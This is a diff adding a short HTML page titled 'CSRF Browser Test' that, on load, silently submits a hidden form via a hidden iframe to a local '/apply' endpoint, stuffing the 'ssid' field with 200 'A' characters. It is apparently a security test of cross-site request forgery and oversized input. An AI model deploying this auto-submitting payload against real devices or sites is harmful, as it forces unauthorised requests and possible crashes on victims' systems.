@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Browser Test</title>
+</head>
+<body>
+  <h2>Background Request</h2>
+  <p>123456789.</p>
+
+  <iframe name="hiddenTarget" style="display:none;"></iframe>
+
+  <form id="testForm" action="http://127.0.0.1:5000/apply" method="POST" target="hiddenTarget" style="display:none;">
+    <input type="hidden" name="ssid" id="payloadInput">
+  </form>
+
+  <script>
+    document.getElementById("payloadInput").value = "A".repeat(200);
+
+    window.onload = function() {
+      console.log("[*] POST isteği http://127.0.0.1:5000/apply adresine gönderiliyor...");
+      document.getElementById("testForm").submit();
+    };
+  </script>
+</body>
+</html>
